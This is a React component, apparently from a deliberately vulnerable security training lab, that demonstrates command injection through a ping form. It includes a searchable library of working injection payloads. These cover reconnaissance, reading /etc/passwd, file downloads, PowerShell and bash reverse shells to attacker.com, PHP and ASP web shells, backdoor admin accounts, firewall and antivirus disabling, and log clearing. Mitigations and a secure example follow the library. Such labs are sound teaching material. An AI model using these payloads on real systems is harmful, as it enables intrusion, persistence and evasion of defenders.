import React, { useState } from 'react';
import axios from 'axios';

function CommandInjection() {
  const [host, setHost] = useState('127.0.0.1');
  const [output, setOutput] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [selectedCategory, setSelectedCategory] = useState('all');
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedPlatform, setSelectedPlatform] = useState('all');
  const [currentPage, setCurrentPage] = useState(1);
  const itemsPerPage = 12;

  const handlePing = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setOutput('');

    try {
      const response = await axios.post('/api/ping', { host });
      setOutput(response.data.output);
    } catch (err) {
      setError(err.response?.data?.error || 'Ping failed');
    } finally {
      setLoading(false);
    }
  };

  const examplePayloads = [
    {
      name: 'Basic Ping',
      payload: '127.0.0.1',
      description: 'Normal ping to localhost',
      category: 'basic'
    },
    {
      name: 'Command Separator - Semicolon (;)',
      payload: '127.0.0.1; whoami',
      description: 'Execute multiple commands sequentially',
      category: 'separators'
    },
    {
      name: 'Command Separator - Double Ampersand (&&)',
      payload: '127.0.0.1 && whoami',
      description: 'Execute second command only if first succeeds',
      category: 'separators'
    },
    {
      name: 'Command Separator - Double Pipe (||)',
      payload: '127.0.0.1 || whoami',
      description: 'Execute second command only if first fails',
      category: 'separators'
    },
    {
      name: 'Command Separator - Pipe (|)',
      payload: '127.0.0.1 | whoami',
      description: 'Pipe output from first to second command',
      category: 'separators'
    },
    {
      name: 'Command Separator - Newline',
      payload: '127.0.0.1\nwhoami',
      description: 'Use newline character as command separator',
      category: 'separators'
    },
    {
      name: 'Command Separator - Backtick',
      payload: '127.0.0.1 `whoami`',
      description: 'Use backticks for command substitution',
      category: 'separators'
    },
    {
      name: 'Command Separator - Dollar Parentheses',
      payload: '127.0.0.1 $(whoami)',
      description: 'Use $() for command substitution',
      category: 'separators'
    },
    {
      name: 'List Files (Windows)',
      payload: '127.0.0.1 && dir',
      description: 'List files in current directory',
      category: 'information_gathering'
    },
    {
      name: 'List Files (Linux)',
      payload: '127.0.0.1 && ls -la',
      description: 'List files with detailed information',
      category: 'information_gathering'
    },
    {
      name: 'System Information (Windows)',
      payload: '127.0.0.1 && systeminfo',
      description: 'Get detailed system information',
      category: 'information_gathering'
    },
    {
      name: 'System Information (Linux)',
      payload: '127.0.0.1 && uname -a',
      description: 'Get kernel and system information',
      category: 'information_gathering'
    },
    {
      name: 'Network Information (Windows)',
      payload: '127.0.0.1 && ipconfig /all',
      description: 'Get detailed network configuration',
      category: 'information_gathering'
    },
    {
      name: 'Network Information (Linux)',
      payload: '127.0.0.1 && ifconfig',
      description: 'Get network interface information',
      category: 'information_gathering'
    },
    {
      name: 'Process List (Windows)',
      payload: '127.0.0.1 && tasklist',
      description: 'List all running processes',
      category: 'information_gathering'
    },
    {
      name: 'Process List (Linux)',
      payload: '127.0.0.1 && ps aux',
      description: 'List all running processes with details',
      category: 'information_gathering'
    },
    {
      name: 'Environment Variables',
      payload: '127.0.0.1 && set',
      description: 'Show all environment variables',
      category: 'information_gathering'
    },
    {
      name: 'Current User (Windows)',
      payload: '127.0.0.1 && whoami',
      description: 'Show current user information',
      category: 'information_gathering'
    },
    {
      name: 'Current User (Linux)',
      payload: '127.0.0.1 && id',
      description: 'Show user and group information',
      category: 'information_gathering'
    },
    {
      name: 'Read File (Windows)',
      payload: '127.0.0.1 && type C:\\Windows\\System32\\drivers\\etc\\hosts',
      description: 'Read system hosts file',
      category: 'file_operations'
    },
    {
      name: 'Read File (Linux)',
      payload: '127.0.0.1 && cat /etc/passwd',
      description: 'Read system password file',
      category: 'file_operations'
    },
    {
      name: 'Write File (Windows)',
      payload: '127.0.0.1 && echo test > test.txt',
      description: 'Create or overwrite a file',
      category: 'file_operations'
    },
    {
      name: 'Write File (Linux)',
      payload: '127.0.0.1 && echo test > test.txt',
      description: 'Create or overwrite a file',
      category: 'file_operations'
    },
    {
      name: 'Append to File',
      payload: '127.0.0.1 && echo test >> test.txt',
      description: 'Append content to existing file',
      category: 'file_operations'
    },
    {
      name: 'Delete File (Windows)',
      payload: '127.0.0.1 && del /f /q test.txt',
      description: 'Force delete a file',
      category: 'file_operations'
    },
    {
      name: 'Delete File (Linux)',
      payload: '127.0.0.1 && rm -f test.txt',
      description: 'Force delete a file',
      category: 'file_operations'
    },
    {
      name: 'Create Directory',
      payload: '127.0.0.1 && mkdir test_dir',
      description: 'Create a new directory',
      category: 'file_operations'
    },
    {
      name: 'Network Connections (Windows)',
      payload: '127.0.0.1 && netstat -an',
      description: 'Show all network connections',
      category: 'network_operations'
    },
    {
      name: 'Network Connections (Linux)',
      payload: '127.0.0.1 && netstat -tulpn',
      description: 'Show listening ports and connections',
      category: 'network_operations'
    },
    {
      name: 'DNS Lookup',
      payload: '127.0.0.1 && nslookup google.com',
      description: 'Perform DNS lookup',
      category: 'network_operations'
    },
    {
      name: 'Download File (Windows)',
      payload: '127.0.0.1 && certutil -urlcache -split -f http://example.com/file.exe file.exe',
      description: 'Download file using certutil',
      category: 'network_operations'
    },
    {
      name: 'Download File (Linux)',
      payload: '127.0.0.1 && wget http://example.com/file',
      description: 'Download file using wget',
      category: 'network_operations'
    },
    {
      name: 'Service Information (Windows)',
      payload: '127.0.0.1 && sc query',
      description: 'List all Windows services',
      category: 'system_operations'
    },
    {
      name: 'Service Information (Linux)',
      payload: '127.0.0.1 && systemctl list-units',
      description: 'List all systemd services',
      category: 'system_operations'
    },
    {
      name: 'User Accounts (Windows)',
      payload: '127.0.0.1 && net user',
      description: 'List all user accounts',
      category: 'system_operations'
    },
    {
      name: 'User Accounts (Linux)',
      payload: '127.0.0.1 && cat /etc/passwd',
      description: 'List all user accounts',
      category: 'system_operations'
    },
    {
      name: 'Scheduled Tasks (Windows)',
      payload: '127.0.0.1 && schtasks /query',
      description: 'List scheduled tasks',
      category: 'system_operations'
    },
    {
      name: 'Scheduled Tasks (Linux)',
      payload: '127.0.0.1 && crontab -l',
      description: 'List cron jobs for current user',
      category: 'system_operations'
    },
    {
      name: 'Reverse Shell (Windows)',
      payload: '127.0.0.1 && powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\'attacker.com\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
      description: 'PowerShell reverse shell (DANGEROUS)',
      category: 'reverse_shell'
    },
    {
      name: 'Reverse Shell (Linux)',
      payload: '127.0.0.1 && bash -i >& /dev/tcp/attacker.com/4444 0>&1',
      description: 'Bash reverse shell (DANGEROUS)',
      category: 'reverse_shell'
    },
    {
      name: 'Web Shell (PHP)',
      payload: '127.0.0.1 && echo \'<?php system($_GET["cmd"]); ?>\' > shell.php',
      description: 'Create PHP web shell (DANGEROUS)',
      category: 'web_shell'
    },
    {
      name: 'Web Shell (ASP)',
      payload: '127.0.0.1 && echo \'<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>\' > shell.asp',
      description: 'Create ASP web shell (DANGEROUS)',
      category: 'web_shell'
    },
    {
      name: 'Add User (Windows)',
      payload: '127.0.0.1 && net user hacker Password123! /add && net localgroup administrators hacker /add',
      description: 'Create new admin user (DANGEROUS)',
      category: 'privilege_escalation'
    },
    {
      name: 'Add User (Linux)',
      payload: '127.0.0.1 && useradd -m -s /bin/bash hacker && echo "hacker:Password123!" | chpasswd && usermod -aG sudo hacker',
      description: 'Create new sudo user (DANGEROUS)',
      category: 'privilege_escalation'
    },
    {
      name: 'Disable Firewall (Windows)',
      payload: '127.0.0.1 && netsh advfirewall set allprofiles state off',
      description: 'Disable Windows firewall (DANGEROUS)',
      category: 'defense_evasion'
    },
    {
      name: 'Disable Firewall (Linux)',
      payload: '127.0.0.1 && ufw disable',
      description: 'Disable UFW firewall (DANGEROUS)',
      category: 'defense_evasion'
    },
    {
      name: 'Kill Process (Windows)',
      payload: '127.0.0.1 && taskkill /f /im antivirus.exe',
      description: 'Force kill a process (DANGEROUS)',
      category: 'defense_evasion'
    },
    {
      name: 'Kill Process (Linux)',
      payload: '127.0.0.1 && pkill -f antivirus',
      description: 'Kill process by name (DANGEROUS)',
      category: 'defense_evasion'
    },
    {
      name: 'Clear Logs (Windows)',
      payload: '127.0.0.1 && wevtutil el | foreach {wevtutil cl $_}',
      description: 'Clear all Windows event logs (DANGEROUS)',
      category: 'defense_evasion'
    },
    {
      name: 'Clear Logs (Linux)',
      payload: '127.0.0.1 && echo "" > /var/log/auth.log',
      description: 'Clear authentication logs (DANGEROUS)',
      category: 'defense_evasion'
    }
  ];

  const categories = {
    basic: '基础命令',
    separators: '命令分隔符',
    information_gathering: '信息收集',
    file_operations: '文件操作',
    network_operations: '网络操作',
    system_operations: '系统操作',
    reverse_shell: '反向Shell',
    web_shell: 'Web Shell',
    privilege_escalation: '权限提升',
    defense_evasion: '防御规避'
  };

  // 检测载荷的平台类型
  const detectPlatform = (payload) => {
    if (payload.payload.includes('dir') || payload.payload.includes('systeminfo') || 
        payload.payload.includes('ipconfig') || payload.payload.includes('tasklist') ||
        payload.payload.includes('net user') || payload.payload.includes('schtasks') ||
        payload.payload.includes('certutil') || payload.payload.includes('powershell') ||
        payload.payload.includes('del ') || payload.payload.includes('type ') ||
        payload.payload.includes('C:\\')) {
      return 'windows';
    } else if (payload.payload.includes('ls') || payload.payload.includes('uname') ||
               payload.payload.includes('ifconfig') || payload.payload.includes('ps aux') ||
               payload.payload.includes('cat /etc') || payload.payload.includes('rm ') ||
               payload.payload.includes('mkdir') || payload.payload.includes('wget') ||
               payload.payload.includes('systemctl') || payload.payload.includes('crontab') ||
               payload.payload.includes('bash') || payload.payload.includes('ufw')) {
      return 'linux';
    }
    return 'both';
  };

  // 为每个载荷添加平台信息
  const payloadsWithPlatform = examplePayloads.map(payload => ({
    ...payload,
    platform: detectPlatform(payload)
  }));

  // 过滤载荷
  const filteredPayloads = payloadsWithPlatform.filter(payload => {
    const matchesCategory = selectedCategory === 'all' || payload.category === selectedCategory;
    const matchesPlatform = selectedPlatform === 'all' || payload.platform === selectedPlatform || payload.platform === 'both';
    const matchesSearch = payload.name.toLowerCase().includes(searchTerm.toLowerCase()) || 
                         payload.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         payload.payload.toLowerCase().includes(searchTerm.toLowerCase());
    return matchesCategory && matchesPlatform && matchesSearch;
  });

  // 分页计算
  const totalPages = Math.ceil(filteredPayloads.length / itemsPerPage);
  const startIndex = (currentPage - 1) * itemsPerPage;
  const endIndex = startIndex + itemsPerPage;
  const currentPayloads = filteredPayloads.slice(startIndex, endIndex);

  // 重置页码当过滤条件改变时
  React.useEffect(() => {
    setCurrentPage(1);
  }, [selectedCategory, selectedPlatform, searchTerm]);

  return (
    <div className="component">
      <h2>Command Injection</h2>
      
      <div className="vulnerability-info">
        <h4>命令注入漏洞</h4>
        <p>
          这个ping功能存在命令注入漏洞，因为直接执行用户输入的命令而没有进行适当的输入清理。
        </p>
        <ul>
          <li>漏洞端点: <code>/api/ping</code></li>
          <li>直接使用用户输入执行命令</li>
          <li>没有输入验证或清理</li>
          <li>Shell命令注入漏洞</li>
        </ul>
        <p style={{ color: '#dc3545', fontWeight: 'bold' }}>
          ⚠️ 警告：请谨慎使用命令注入载荷，它们可能会损坏您的系统！
        </p>
      </div>

      <form onSubmit={handlePing}>
        <div className="form-group">
          <label htmlFor="host">要ping的主机:</label>
          <input
            type="text"
            id="host"
            value={host}
            onChange={(e) => setHost(e.target.value)}
            placeholder="输入主机名或IP地址"
          />
        </div>

        <button type="submit" className="btn" disabled={loading}>
          {loading ? 'Pinging...' : 'Ping主机'}
        </button>
      </form>

      {error && <div className="error">{error}</div>}

      {output && (
        <div className="results">
          <h4>命令输出:</h4>
          <div className="command-output">
            {output}
          </div>
        </div>
      )}

      <div className="payloads-library" style={{ marginTop: '30px' }}>
        <div className="library-header" style={{ 
          display: 'flex', 
          justifyContent: 'space-between', 
          alignItems: 'center',
          marginBottom: '20px',
          flexWrap: 'wrap',
          gap: '15px'
        }}>
          <h4>命令注入载荷库</h4>
          
          <div style={{ display: 'flex', gap: '15px', alignItems: 'center', flexWrap: 'wrap' }}>
            <div className="form-group" style={{ margin: 0 }}>
              <input
                type="text"
                placeholder="搜索载荷..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                style={{ 
                  padding: '8px 12px',
                  border: '1px solid #ced4da',
                  borderRadius: '4px',
                  fontSize: '14px',
                  width: '200px'
                }}
              />
            </div>
            
            <select 
              value={selectedCategory} 
              onChange={(e) => setSelectedCategory(e.target.value)}
              style={{ 
                padding: '8px 12px',
                border: '1px solid #ced4da',
                borderRadius: '4px',
                fontSize: '14px',
                background: 'white'
              }}
            >
              <option value="all">所有分类 ({examplePayloads.length})</option>
              {Object.entries(categories).map(([key, name]) => (
                <option key={key} value={key}>
                  {name} ({examplePayloads.filter(p => p.category === key).length})
                </option>
              ))}
            </select>
          </div>
        </div>

        {/* 平台标签页 */}
        <div className="platform-tabs" style={{ 
          display: 'flex', 
          gap: '10px', 
          marginBottom: '20px',
          borderBottom: '1px solid #dee2e6',
          paddingBottom: '15px'
        }}>
          {[
            { key: 'all', label: '全部平台', count: payloadsWithPlatform.length },
            { key: 'windows', label: 'Windows', count: payloadsWithPlatform.filter(p => p.platform === 'windows' || p.platform === 'both').length },
            { key: 'linux', label: 'Linux', count: payloadsWithPlatform.filter(p => p.platform === 'linux' || p.platform === 'both').length }
          ].map(tab => (
            <button
              key={tab.key}
              onClick={() => setSelectedPlatform(tab.key)}
              style={{
                padding: '10px 20px',
                border: 'none',
                background: selectedPlatform === tab.key ? '#007bff' : '#f8f9fa',
                color: selectedPlatform === tab.key ? 'white' : '#495057',
                borderRadius: '5px',
                cursor: 'pointer',
                fontWeight: '600',
                fontSize: '14px',
                transition: 'all 0.3s'
              }}
            >
              {tab.label} ({tab.count})
            </button>
          ))}
        </div>

        <div className="category-stats" style={{ 
          background: '#f8f9fa', 
          padding: '15px', 
          borderRadius: '8px',
          marginBottom: '20px'
        }}>
          <div style={{ display: 'flex', gap: '20px', flexWrap: 'wrap' }}>
            <div>
              <strong>当前显示:</strong> {filteredPayloads.length} 个载荷
            </div>
            <div>
              <strong>搜索:</strong> {searchTerm || '无'}
            </div>
            <div>
              <strong>分类:</strong> {selectedCategory === 'all' ? '全部' : categories[selectedCategory]}
            </div>
            <div>
              <strong>平台:</strong> {selectedPlatform === 'all' ? '全部' : selectedPlatform === 'windows' ? 'Windows' : 'Linux'}
            </div>
            <div>
              <strong>页码:</strong> {currentPage} / {totalPages}
            </div>
          </div>
        </div>

        {currentPayloads.length === 0 ? (
          <div style={{ 
            textAlign: 'center', 
            padding: '40px', 
            color: '#6c757d',
            background: '#f8f9fa',
            borderRadius: '8px'
          }}>
            <h5>没有找到匹配的载荷</h5>
            <p>请尝试其他搜索词或选择不同的分类/平台</p>
          </div>
        ) : (
          <>
            <div className="payloads-grid" style={{ 
              display: 'grid',
              gridTemplateColumns: 'repeat(auto-fill, minmax(350px, 1fr))',
              gap: '20px',
              marginBottom: '30px'
            }}>
              {currentPayloads.map((example, index) => (
                <div key={index} className="payload-card" style={{ 
                  background: 'white',
                  border: '1px solid #dee2e6',
                  borderRadius: '8px',
                  padding: '20px',
                  boxShadow: '0 2px 4px rgba(0,0,0,0.1)',
                  transition: 'transform 0.2s, box-shadow 0.2s'
                }}>
                  <div className="payload-header" style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'flex-start',
                    marginBottom: '12px'
                  }}>
                    <h6 style={{ 
                      margin: 0, 
                      color: '#343a40',
                      fontSize: '16px',
                      fontWeight: '600'
                    }}>
                      {example.name}
                    </h6>
                    <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                      {example.description.includes('DANGEROUS') && (
                        <span style={{ 
                          background: '#dc3545', 
                          color: 'white', 
                          padding: '2px 6px', 
                          borderRadius: '3px',
                          fontSize: '10px',
                          fontWeight: 'bold'
                        }}>
                          危险
                        </span>
                      )}
                      <span style={{ 
                        background: example.platform === 'windows' ? '#007bff' : 
                                   example.platform === 'linux' ? '#28a745' : '#6c757d',
                        color: 'white', 
                        padding: '2px 6px', 
                        borderRadius: '3px',
                        fontSize: '10px'
                      }}>
                        {example.platform === 'windows' ? 'Windows' : 
                         example.platform === 'linux' ? 'Linux' : '通用'}
                      </span>
                      <span style={{ 
                        background: '#6c757d', 
                        color: 'white', 
                        padding: '2px 6px', 
                        borderRadius: '3px',
                        fontSize: '10px'
                      }}>
                        {categories[example.category]}
                      </span>
                    </div>
                  </div>
                  
                  <code style={{ 
                    display: 'block', 
                    background: '#1e1e1e', 
                    color: '#00ff00',
                    padding: '12px',
                    borderRadius: '4px',
                    fontSize: '12px',
                    margin: '12px 0',
                    overflow: 'auto',
                    maxHeight: '120px',
                    fontFamily: 'Courier New, monospace',
                    whiteSpace: 'pre-wrap',
                    wordBreak: 'break-all'
                  }}>
                    {example.payload}
                  </code>
                  
                  <p style={{ 
                    margin: 0, 
                    fontSize: '14px', 
                    color: '#6c757d',
                    lineHeight: '1.5',
                    marginBottom: '15px'
                  }}>
                    {example.description}
                  </p>
                  
                  <button
                    className="btn btn-primary"
                    onClick={() => {
                      setHost(example.payload);
                      document.getElementById('host').focus();
                    }}
                    style={{ 
                      width: '100%',
                      padding: '8px 16px',
                      fontSize: '14px'
                    }}
                  >
                    使用此载荷
                  </button>
                </div>
              ))}
            </div>

            {/* 分页控件 */}
            {totalPages > 1 && (
              <div className="pagination" style={{ 
                display: 'flex', 
                justifyContent: 'center', 
                alignItems: 'center',
                gap: '10px',
                marginTop: '20px'
              }}>
                <button
                  onClick={() => setCurrentPage(prev => Math.max(prev - 1, 1))}
                  disabled={currentPage === 1}
                  style={{
                    padding: '8px 16px',
                    border: '1px solid #dee2e6',
                    background: currentPage === 1 ? '#f8f9fa' : 'white',
                    color: currentPage === 1 ? '#6c757d' : '#007bff',
                    borderRadius: '4px',
                    cursor: currentPage === 1 ? 'not-allowed' : 'pointer'
                  }}
                >
                  上一页
                </button>
                
                <div style={{ display: 'flex', gap: '5px' }}>
                  {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
                    let pageNum;
                    if (totalPages <= 5) {
                      pageNum = i + 1;
                    } else if (currentPage <= 3) {
                      pageNum = i + 1;
                    } else if (currentPage >= totalPages - 2) {
                      pageNum = totalPages - 4 + i;
                    } else {
                      pageNum = currentPage - 2 + i;
                    }
                    
                    return (
                      <button
                        key={pageNum}
                        onClick={() => setCurrentPage(pageNum)}
                        style={{
                          padding: '8px 12px',
                          border: '1px solid #dee2e6',
                          background: currentPage === pageNum ? '#007bff' : 'white',
                          color: currentPage === pageNum ? 'white' : '#007bff',
                          borderRadius: '4px',
                          cursor: 'pointer',
                          fontWeight: currentPage === pageNum ? 'bold' : 'normal'
                        }}
                      >
                        {pageNum}
                      </button>
                    );
                  })}
                </div>
                
                <button
                  onClick={() => setCurrentPage(prev => Math.min(prev + 1, totalPages))}
                  disabled={currentPage === totalPages}
                  style={{
                    padding: '8px 16px',
                    border: '1px solid #dee2e6',
                    background: currentPage === totalPages ? '#f8f9fa' : 'white',
                    color: currentPage === totalPages ? '#6c757d' : '#007bff',
                    borderRadius: '4px',
                    cursor: currentPage === totalPages ? 'not-allowed' : 'pointer'
                  }}
                >
                  下一页
                </button>
                
                <span style={{ color: '#6c757d', fontSize: '14px' }}>
                  第 {currentPage} 页，共 {totalPages} 页
                </span>
              </div>
            )}
          </>
        )}
      </div>

      <div className="attack-scenarios" style={{ marginTop: '30px' }}>
        <h4>Attack Scenarios:</h4>
        
        <div className="vulnerability-card">
          <h5>Scenario 1: Information Disclosure</h5>
          <p>
            An attacker can execute system commands to gather information about the server environment,
            such as file system structure, running processes, network configuration, and system details.
          </p>
        </div>

        <div className="vulnerability-card">
          <h5>Scenario 2: Data Theft</h5>
          <p>
            Attackers can read sensitive files like configuration files, database credentials, 
            or application source code by executing commands like <code>cat /etc/passwd</code> or 
            <code>cat config/database.json</code>.
          </p>
        </div>

        <div className="vulnerability-card">
          <h5>Scenario 3: System Compromise</h5>
          <p>
            Attackers can establish reverse shells, install backdoors, modify system files, 
            or even take complete control of the server by executing malicious commands.
          </p>
        </div>

        <div className="vulnerability-card">
          <h5>Scenario 4: Denial of Service</h5>
          <p>
            Attackers can execute resource-intensive commands or delete critical files to cause 
            service disruption or complete system failure.
          </p>
        </div>
      </div>

      <div className="mitigation-info" style={{ marginTop: '30px' }}>
        <h4>Mitigation Strategies:</h4>
        <ul>
          <li>Avoid executing shell commands with user input</li>
          <li>Use built-in libraries instead of shell commands</li>
          <li>Implement strict input validation (whitelist approach)</li>
          <li>Use parameterized command execution</li>
          <li>Run applications with least privilege</li>
          <li>Use process isolation and containerization</li>
          <li>Implement proper error handling (don't expose command output)</li>
          <li>Use security scanning tools to detect vulnerabilities</li>
        </ul>
      </div>

      <div className="secure-example" style={{ marginTop: '30px' }}>
        <h4>Secure Implementation Example:</h4>
        <pre style={{ 
          background: '#f8f9fa', 
          padding: '15px', 
          borderRadius: '5px',
          border: '1px solid #dee2e6',
          textAlign: 'left'
        }}>
{`// Secure ping implementation using built-in libraries
const ping = require('ping');

app.post('/api/ping/secure', async (req, res) => {
  const { host } = req.body;
  
  // Validate input (only allow IP addresses and hostnames)
  if (!isValidHost(host)) {
    return res.status(400).json({ error: 'Invalid host' });
  }
  
  try {
    const result = await ping.promise.probe(host);
    res.json({ 
      alive: result.alive,
      output: \`Ping to \${host}: \${result.alive ? 'successful' : 'failed'}\`
    });
  } catch (error) {
    res.status(500).json({ error: 'Ping failed' });
  }
});

function isValidHost(host) {
  // Implement proper host validation
  const hostRegex = /^[a-zA-Z0-9.-]+$/;
  return hostRegex.test(host) && host.length <= 255;
}`}
        </pre>
      </div>
    </div>
  );
}

export default CommandInjection;
